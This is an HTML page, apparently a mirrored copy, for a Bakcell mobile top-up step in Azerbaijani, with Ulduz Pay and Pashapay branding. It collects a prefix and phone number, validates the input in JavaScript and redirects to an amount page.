<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bakcell</title>

    <link rel="stylesheet"
        href="../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, Helvetica, sans-serif;
            background: #dedee6;
            color: #0d2340;
            min-height: 100vh;
        }

        .page {
            max-width: 420px;
            margin: 0 auto;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            padding: 24px 16px 30px;
        }

        .logo {
            display: flex;
            justify-content: center;
            padding: 20px 0 34px;
        }

        .logo img {
            width: 180px;
            height: auto;
        }

        .card {
            background: #fff;
            border-radius: 18px;
            border: 1px solid #e9e9ee;
            padding: 30px 20px 26px;
        }

        .title {
            font-size: 20px;
            font-weight: 700;
            color: #10213f;
            margin-bottom: 24px;
        }

        .link {
            color: #0b5ed7;
            margin-bottom: 28px;
            display: inline-block;
            text-decoration: none;
            font-size: 14px;
            font-weight: 400;
        }

        .field {
            margin-bottom: 22px;
        }

        label {
            display: block;
            font-size: 14px;
            margin-bottom: 8px;
            color: #5b657a;
            font-weight: 400;
        }

        input,
        select {
            width: 100%;
            height: 46px;
            padding: 0 16px;
            border-radius: 8px;
            border: 1px solid #d6d6dd;
            font-size: 15px;
            color: #1f2a44;
            background: #fff;
            outline: none;
            transition: border-color 0.2s ease, box-shadow 0.2s ease;
            -webkit-appearance: none;
            appearance: none;
        }

        input::placeholder {
            color: #9aa3b2;
        }

        input:focus,
        select:focus {
            border-color: #b9c7dd;
            box-shadow: 0 0 0 3px rgba(139, 182, 232, 0.12);
        }

        .actions {
            display: flex;
            gap: 14px;
            margin-top: 24px;
        }

        .btn {
            flex: 1;
            height: 44px;
            border-radius: 8px;
            border: 1px solid #cfd3da;
            background: #fff;
            cursor: pointer;
            font-size: 15px;
            font-weight: 600;
            color: #6a7487;
            transition: all 0.2s ease;
        }

        .btn-back {
            background: #fff;
            color: #6a7487;
        }

        .btn-primary {
            background: #a9cdf4;
            border: none;
            color: #fff;
            font-weight: 700;
        }

        .btn-primary:disabled {
            background: #a9cdf4;
            color: #fff;
            opacity: 1;
            cursor: not-allowed;
        }

        .btn-primary.active {
            background: #0d6efd;
            box-shadow: 0 6px 14px rgba(13, 110, 253, 0.22);
            cursor: pointer;
        }

        .btn-primary.active:hover {
            transform: translateY(-1px);
        }

        .footer {
            margin-top: auto;
            text-align: center;
            padding-top: 90px;
        }

        .footer-text {
            color: #657188;
            font-size: 14px;
            font-weight: 600;
        }

        .footer-icons {
            margin-top: 18px;
            display: flex;
            justify-content: center;
            gap: 22px;
            font-size: 22px;
        }

        .footer-icons i {
            color: #99a1b1;
            cursor: default;
            transition: .2s;
        }

        .footer-icons .fa-facebook:hover {
            color: #1877f2;
        }

        .footer-icons .fa-instagram:hover {
            color: #e1306c;
        }

        .footer-icons .fa-telegram:hover {
            color: #229ED9;
        }

        @media (max-width: 480px) {
            .page {
                padding: 20px 14px 30px;
            }

            .card {
                padding: 28px 18px 24px;
            }
        }
    </style>
</head>

<body>

    <div class="page">

        <div class="logo">
            <img src="ulduzpay.jpg" alt="Ulduz Pay Logo" style="max-width: 200px;">
        </div>

        <div class="card">

            <div class="title">
                Bakcell            </div>

            <a href="#" class="link">Məlumatı əlavə edin</a>

            <div class="field">

                <label for="prefix">Prefiks</label>

                <select name="prefix" id="prefix">

                    <option value="050" >050</option>
                    <option value="051" >051</option>
                    <option value="010" >010</option>
                    <option value="055" selected>055</option>
                    <option value="099" >099</option>
                    <option value="070" >070</option>
                    <option value="077" >077</option>

                </select>

            </div>

            <div class="field">

                <label for="number">Nömrə</label>

                <input
                    type="text"
                    id="number"
                    placeholder="XXXXXXX"
                    inputmode="numeric"
                    maxlength="7"
                    oninput="validateNumber(this)">

            </div>

            <div class="actions">

                <button type="button"
                    class="btn btn-back"
                    onclick="history.back()">
                    Geri qayıt
                </button>

                <button type="button"
                    class="btn btn-primary"
                    id="continueBtn"
                    disabled
                    onclick="submitForm()">
                    DAVAM ET
                </button>

            </div>

        </div>

        <div class="footer">

            <div class="footer-text">
                Pashapay 2026 © Bütün hüquqlar qorunur
            </div>

            <div class="footer-icons">
                <i class="fab fa-facebook"></i>
                <i class="fab fa-instagram"></i>
                <i class="fab fa-telegram"></i>
            </div>

        </div>

    </div>

    <script>

        function validateNumber(input) {

            input.value = input.value
                .replace(/[^0-9]/g, '')
                .slice(0, 7);

            const btn = document.getElementById('continueBtn');

            const isValid = input.value.length === 7;

            btn.disabled = !isValid;

            if (isValid) {
                btn.classList.add('active');
            } else {
                btn.classList.remove('active');
            }
        }

        function submitForm() {

            const number = document.getElementById('number').value;

            if (number.length !== 7) return;

            const prefix = document.getElementById('prefix').value;

            const fullNumber = prefix + number;

            const op = "Bakcell";

            window.location.href =
                'meblegc2cc.html?number=' + encodeURIComponent(fullNumber) +
                '&op=' + encodeURIComponent(op);
        }

    </script>

</body>
